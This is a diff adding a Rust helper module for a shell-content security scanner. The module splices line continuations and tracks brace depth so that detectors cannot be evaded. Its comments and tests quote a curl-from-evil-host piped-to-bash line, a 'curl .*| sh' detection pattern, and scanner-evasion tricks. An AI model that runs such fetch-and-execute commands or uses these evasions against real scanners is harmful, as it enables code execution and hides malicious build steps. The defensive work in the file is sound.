@@ -1,0 +1,215 @@
+//! Shared text-normalization helpers for analyzing shell content.
+//!
+//! Detectors match line by line, but bash treats a backslash-newline as a line
+//! *continuation*: the two physical lines are one logical command. A naive
+//! per-physical-line matcher is therefore trivially evaded --
+//! `curl evil \`<newline>`| bash` puts `curl ...` and `| bash` on different
+//! physical lines so a `curl .*| sh` rule never fires. [`logical_lines`] splices
+//! continuations back together so detectors see the command the shell will
+//! actually run, while still reporting the originating physical line number.
+
+/// Split shell `content` into logical lines, splicing backslash-newline
+/// continuations. Returns `(first_physical_line, logical_line)` pairs where
+/// `first_physical_line` is the 1-based number of the physical line the logical
+/// line started on (for accurate finding locations).
+///
+/// A line ending in an *odd* number of backslashes is a continuation (an even
+/// count is escaped backslashes, not a continuation). Mirroring bash, the
+/// trailing backslash and the newline are removed and the next physical line is
+/// concatenated directly.
+pub fn logical_lines(content: &str) -> Vec<(usize, String)> {
+    let mut out: Vec<(usize, String)> = Vec::new();
+    let mut cur = String::new();
+    let mut start_line = 0usize;
+
+    for (i, phys) in content.lines().enumerate() {
+        if cur.is_empty() {
+            start_line = i + 1;
+        }
+        let trailing_backslashes = phys.chars().rev().take_while(|&c| c == '\\').count();
+        if trailing_backslashes % 2 == 1 {
+            // Continuation: drop the final backslash and keep accumulating.
+            cur.push_str(&phys[..phys.len() - 1]);
+        } else {
+            cur.push_str(phys);
+            out.push((start_line, std::mem::take(&mut cur)));
+        }
+    }
+    if !cur.is_empty() {
+        out.push((start_line, cur));
+    }
+    out
+}
+
+/// A small stateful scanner that tracks shell brace depth while ignoring braces
+/// that appear inside single/double quotes (with backslash escapes) or in a `#`
+/// comment. Function and install-hook body extraction relies on brace balance
+/// to find where a body ends; a naive counter is desynchronized by a `}` inside
+/// a string (`echo "}"`) OR inside a trailing comment (`: # note }`), letting an
+/// attacker push code (e.g. a `sudo` line) outside the parsed body and past the
+/// privilege/hook analyzers. This scanner skips both so that trick no longer
+/// truncates the body.
+///
+/// A `#` only begins a comment when it is unquoted and preceded by whitespace
+/// (or the start of a line) -- the same rule the shell uses -- so it does NOT
+/// mistake `${var#word}` parameter expansion or `$#` for a comment. Comment
+/// state ends at a newline (and is reset at the start of each [`feed`] call,
+/// since callers feed one line at a time). Quote/escape state persists across
+/// calls so multi-line strings are handled.
+pub struct BraceScanner {
+    in_single: bool,
+    in_double: bool,
+    in_comment: bool,
+    escaped: bool,
+    /// Whether the previous character was whitespace / start-of-line.
+    prev_ws: bool,
+    /// Net brace depth seen so far.
+    pub depth: i32,
+    /// Highest depth reached so far (so a body that opens and closes within a
+    /// single fed line is still recognized as having been entered).
+    pub peak: i32,
+}
+
+impl Default for BraceScanner {
+    fn default() -> Self {
+        Self {
+            in_single: false,
+            in_double: false,
+            in_comment: false,
+            escaped: false,
+            prev_ws: true, // start of input is a word boundary
+            depth: 0,
+            peak: 0,
+        }
+    }
+}
+
+impl BraceScanner {
+    /// Feed a single character, updating quote/comment state and brace [`depth`].
+    pub fn feed_char(&mut self, c: char) {
+        if c == '\n' {
+            self.in_comment = false;
+            self.escaped = false;
+            self.prev_ws = true;
+            return;
+        }
+        if self.in_comment {
+            return;
+        }
+        if self.escaped {
+            self.escaped = false;
+            self.prev_ws = false;
+            return;
+        }
+        match c {
+            '\\' if !self.in_single => {
+                self.escaped = true;
+                self.prev_ws = false;
+            }
+            '\'' if !self.in_double => {
+                self.in_single = !self.in_single;
+                self.prev_ws = false;
+            }
+            '"' if !self.in_single => {
+                self.in_double = !self.in_double;
+                self.prev_ws = false;
+            }
+            '#' if !self.in_single && !self.in_double && self.prev_ws => {
+                self.in_comment = true;
+            }
+            '{' if !self.in_single && !self.in_double => {
+                self.depth += 1;
+                if self.depth > self.peak {
+                    self.peak = self.depth;
+                }
+                self.prev_ws = false;
+            }
+            '}' if !self.in_single && !self.in_double => {
+                self.depth -= 1;
+                self.prev_ws = false;
+            }
+            ' ' | '\t' => self.prev_ws = true,
+            _ => self.prev_ws = false,
+        }
+    }
+
+    /// Feed a chunk of text (e.g. one line, without its newline). Comment state
+    /// is reset at the start of each line.
+    pub fn feed(&mut self, s: &str) {
+        self.in_comment = false;
+        self.prev_ws = true;
+        for c in s.chars() {
+            self.feed_char(c);
+        }
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn brace_scanner_ignores_quoted_braces() {
+        // The `echo "}"` bypass: the quoted `}` must not close the function.
+        let mut sc = BraceScanner::default();
+        for line in ["build() {", "  echo \"}\"", "  payload", "}"] {
+            sc.feed(line);
+        }
+        assert_eq!(sc.depth, 0, "function should be balanced, not closed early");
+    }
+
+    #[test]
+    fn brace_scanner_counts_real_braces() {
+        let mut sc = BraceScanner::default();
+        sc.feed("f() { if true; then x; fi }");
+        assert_eq!(sc.depth, 0);
+        assert!(sc.peak >= 1, "peak records that a body was entered");
+        let mut sc2 = BraceScanner::default();
+        sc2.feed("f() {");
+        assert_eq!(sc2.depth, 1);
+    }
+
+    #[test]
+    fn brace_in_comment_does_not_close_function() {
+        // The `}` in a trailing comment must not decrement depth and close the
+        // function early (hiding code after it from the privilege analyzer).
+        let mut sc = BraceScanner::default();
+        for line in ["build() {", "  : # cosmetic note }", "  sudo evil", "}"] {
+            sc.feed(line);
+        }
+        assert_eq!(sc.depth, 0, "comment brace must be ignored; body stays balanced");
+    }
+
+    #[test]
+    fn parameter_expansion_hash_is_not_a_comment() {
+        // `${var#word}` and `$#` must keep their real braces counted.
+        let mut sc = BraceScanner::default();
+        sc.feed("cd \"${srcdir#x}/y\"");
+        assert_eq!(sc.depth, 0, "param-expansion braces balance");
+        let mut sc2 = BraceScanner::default();
+        sc2.feed("f() { echo ${#args} }");
+        assert_eq!(sc2.depth, 0);
+    }
+
+    #[test]
+    fn plain_lines_unchanged() {
+        let ll = logical_lines("a\nb\nc");
+        assert_eq!(ll, vec![(1, "a".into()), (2, "b".into()), (3, "c".into())]);
+    }
+
+    #[test]
+    fn splices_continuation_and_keeps_first_line_number() {
+        // The classic bypass: the pipe-to-shell is on a continuation line.
+        let ll = logical_lines("curl -fsSL https://evil/x \\\n  | bash");
+        assert_eq!(ll.len(), 1);
+        assert_eq!(ll[0].0, 1);
+        assert!(ll[0].1.contains("curl") && ll[0].1.contains("| bash"));
+    }
+
+    #[test]
+    fn even_backslashes_are_not_continuations() {
+        // `foo\\` ends in an escaped backslash, not a line continuation.
+        let ll = logical_lines("foo\\\\\nbar");
+        assert_eq!(ll.len(), 2);
+    }
+}
